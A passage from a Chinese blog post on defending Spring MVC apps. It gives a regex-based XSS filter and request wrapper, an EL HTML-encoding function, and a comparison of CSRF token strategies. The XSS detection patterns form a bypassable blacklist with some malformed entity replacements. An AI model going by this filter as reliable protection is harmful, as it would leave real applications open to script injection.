value=&quot;$&#123;user.userName&#125;&quot; /&gt; 重写HttpServletRequestWrapper或HttpServletResponseWrapper使用FILTER进行过滤 WEB.XML中添加 123456789101112131415161718&lt;filter&gt; &lt;filter-name&gt;XSS&lt;/filter-name&gt; &lt;filter-class&gt;ssm.sec.filter.XSSFilter&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;XSS&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt; RequestWrapper.java 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108 private static Logger logger = Logger.getLogger(RequestWrapper.class); public RequestWrapper(HttpServletRequest servletRequest) &#123; super(servletRequest); &#125; public String[] getParameterValues(String parameter) &#123; logger.info(&quot;InarameterValues .. parameter .......&quot;); String[] values = super.getParameterValues(parameter); if (values == null) &#123; return null; &#125; int count = values.length; String[] encodedValues = new String[count]; for (int i = 0; i &lt; count; i++) &#123; encodedValues[i] = cleanXSS(values[i]); &#125; return encodedValues; &#125; public String getParameter(String parameter) &#123; logger.info(&quot;Inarameter .. parameter .......&quot;); String value = super.getParameter(parameter); if (value == null) &#123; return null; &#125; logger.info(&quot;Inarameter RequestWrapper ........ value .......&quot;); return cleanXSS(value); &#125; public String getHeader(String name) &#123; logger.info(&quot;Ineader .. parameter .......&quot;); String value = super.getHeader(name); if (value == null) return null; logger.info(&quot;Ineader RequestWrapper ........... value ....&quot;); return cleanXSS(value); &#125; private String cleanXSS(String value) &#123; logger.info(&quot;InnXSS RequestWrapper ...............&quot; + value); value = value.replaceAll(&quot;eval\\((.*)\\)&quot;, &quot;&quot;); value = value.replaceAll(&quot;[\\\&quot;\\\&apos;][\\s]*javascript:(.*)[\\\&quot;\\\&apos;]&quot;, &quot;\&quot;\&quot;&quot;); value = value.replaceAll(&quot;(?i)&lt;script.*?&gt;.*?&lt;script.*?&gt;&quot;, &quot;&quot;); value = value.replaceAll(&quot;(?i)&lt;script.*?&gt;.*?&lt;/script.*?&gt;&quot;, &quot;&quot;); value = value.replaceAll(&quot;(?i)&lt;.*?javascript:.*?&gt;.*?&lt;/.*?&gt;&quot;, &quot;&quot;); value = value.replaceAll(&quot;(?i)&lt;.*?\\s+on.*?&gt;.*?&lt;/.*?&gt;&quot;, &quot;&quot;); value = value.replaceAll(&quot;&lt;&quot;, &quot;&amp; lt;&quot;).replaceAll(&quot;&gt;&quot;, &quot;&amp; gt;&quot;); value = value.replaceAll(&quot;\\(&quot;, &quot;&amp; #40;&quot;).replaceAll(&quot;\\)&quot;, &quot;&amp; #41;&quot;); value = value.replaceAll(&quot;&apos;&quot;, &quot;&amp; #39;&quot;); logger.info(&quot;OutnXSS RequestWrapper ........ value .......&quot; + value); return value; &#125;&#125; XSSFilter.java 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768package ssm.sec.filter;import java.io.IOException;import javax.servlet.Filter;import javax.servlet.FilterChain;import javax.servlet.FilterConfig;import javax.servlet.ServletException;import javax.servlet.ServletRequest;import javax.servlet.ServletResponse;import javax.servlet.http.HttpServletRequest;import org.apache.log4j.Logger;public class XSSFilter implements Filter &#123; private static Logger logger = Logger.getLogger(XSSFilter.class); private FilterConfig filterConfig; public void init(FilterConfig filterConfig) throws ServletException &#123; this.filterConfig = filterConfig; &#125; public void destroy() &#123; this.filterConfig = null; &#125; public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123; logger.info(&quot;Inlter CrossScriptingFilter ...............&quot;); chain.doFilter(new RequestWrapper((HttpServletRequest) request), response); logger.info(&quot;Outlter CrossScriptingFilter ...............&quot;); &#125;&#125; 重新插入数据， 会发现已经进行了过滤处理 数据库查看都是过滤和转义的结果 当然有时候由于业务需要，可能允许用户输入这种危险的字符， 这种通用的并不适用， 但可以考虑把一些特殊的符号转义成中文符号， 也许也恰好能满足业务的需求， 如&lt; 转义成 &lt;等，看起来和英文的一样， 但由于解释器并不识别， 而又变成安全的了。 SPRINGMVC 视图中传递变量一般使用EL表达式 虽然EL中内置许多默认的函数， 但并没有编码处理的函数， 因此只能够自定义函数进行处理。 开发函数处理类，处理类就是普通的类，每个函数对应类中的一个静态方法 123456789101112131415161718192021222324252627282930public class XSSEL &#123; private static Logger logger = Logger.getLogger(XSSEL.class); public static String HTMLEncode(String val)&#123; logger.info(&quot;In EL func values ====&gt;&quot;+ val); if(val != null)&#123; val = val.replace(&quot;&amp;&quot;, &quot;&amp;amp;&quot;).replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;).replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;).replace(&quot;\&quot;&quot;, &quot;&amp;quot;&quot;) .replace(&quot;/&quot;, &quot;&amp;#x2F;&quot;).replace(&quot;&apos;&quot;, &quot;&amp;#x27;&quot;); logger.info(&quot;Out EL func values ====&gt;&quot;+ val); return val; &#125;else&#123; return &quot;&quot;; &#125; &#125;&#125; 建立TLD文件，定义表达式函数 123456789101112131415161718192021222324252627282930313233343536&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;taglib xmlns="http://java.sun.com/xml/ns/j2ee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd" version="2.0"&gt; &lt;tlib-version&gt;1.0&lt;/tlib-version&gt; &lt;short-name&gt;sec&lt;/short-name&gt; &lt;function&gt; &lt;name&gt;HTMLEncode&lt;/name&gt; &lt;function-class&gt;ssm.sec.utils.XSSEL&lt;/function-class&gt; &lt;function-signature&gt;java.lang.String HTMLEncode(java.lang.String)&lt;/function-signature&gt; &lt;/function&gt;&lt;/taglib&gt; 在WEB.XML文件中配置（可省略） 12345678910111213141516&lt;jsp-config&gt; &lt;taglib&gt; &lt;!-- 配置标签的引用地址 JSP页面中引用时使用 --&gt; &lt;taglib-uri&gt;/eltag&lt;/taglib-uri&gt; &lt;!-- 配置标签的TLD文件地址 --&gt; &lt;taglib-location&gt;/WEB-INF/XSSEL.tld&lt;/taglib-location&gt; &lt;/taglib&gt;&lt;/jsp-config&gt; 在JSP页面内导入并且使用 123456&lt;%@ taglib uri=&quot;/eltag&quot; prefix=&quot;sec&quot; %&gt;&lt;%@ taglib uri=&quot;/WEB-INF/XSSEL.tld&quot; prefix=&quot;sec&quot; %&gt;WEB.XML文件中不配置的情况$&#123;sec:HTMLEncode(user.userName)&#125; 针对复杂的业务也可以考虑定义一系列安全编码的方法， 避免重复造轮子的同时也可以增强程序的安全性。 CSRF问题 由于SPRINGMVC 本身不提供像DJANGO那样的CSRF安全接口， 因此在这方面就要脆弱了许多。 这和其他框架的存在和处理的方式亦差不多， 也或者说写出的CSRF代码也更具有通用性。 所以呢主要是浅谈对CSRF问题的处理思路以及相应的好与坏。 1.验证HTTP REFERER字段HTTP协议的REFERER字段会记录请求来源地址。在通常请况下，一般情况下安全请求来自于同一个网站，如果REFERER来源为第三方网站，则很可能是CSRF攻击，即使REFERER是来自于同一个网站，也有很能是站内的CSRF攻击，那么只能通过正则匹配出来源是否为我们指定的允许请求的链接。 2.添加验证码CSRF攻击的过程是在用户不知情的情况下构造网络请求，所以验证码机制是最有效最快捷的方法。但很多时候，出于用户体验的情况下，并不能给所有的操作都添加上验证码，除非某个操作的敏感性、重要性都十分的高，那么可以考虑加上验证码的方式来验证。 3.添加Token值A）.token储存在cookie中Token储存在cookie中，必须考虑两个问题： 1) 假如同域名下存在XSS，那么cookie则可以被盗取； 2) 表单的token值如果和cookie储存的相等，那么当cookie值被盗取的时候，则可以构造出表单cookie； 针对以上两个问题，那么在cookie储存token的实现过程中，必须的有相应的解决方法： 对cookie值储存token设置httponly； 设置httponly在某些情况下还是可以泄露cookie的，因此表单的token和cookie的token得有一个加密的过程。 B）.token储存在session中Token储存在session中，其实和cookie差不多是一个原理，但有点小差别的是session是储存在服务器的，因此诞生的一个问题便是在分布式环境中session不复制的话，那么此机制便失效了，并且会对正常的业务产生影响。 因此，当使用sesseion储存的时候，必须考虑搭建的web环境为非分布式环境。 C）.one-time token(token储存在memcache等中)One-time token即一次性token值，请求一次一页面即获取不同的token值。One-time token的难点在“并行会话”中，如用户在同一个站点当中打开两个一样的页面，那么必然两个表单内容也一样，CSRF防护措施不能导致只有一个页面才能提交表单，其它的表单都包含的是无效的token值。因此one-time token必须要在保证不影响“并行会话”的基础上实现。 以下是实现思路： 1) 生成token值，以此token值作为memcached的key和value储存； 2) 在表单中加入此token值的hidden表单； 3) 验证时比较表单和memcached的token值。 源代码 https://github.com/jige003/ssm-sec]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>java审计</tag>
        <tag>web安全</tag>
      </tags>
  </entry>
</search>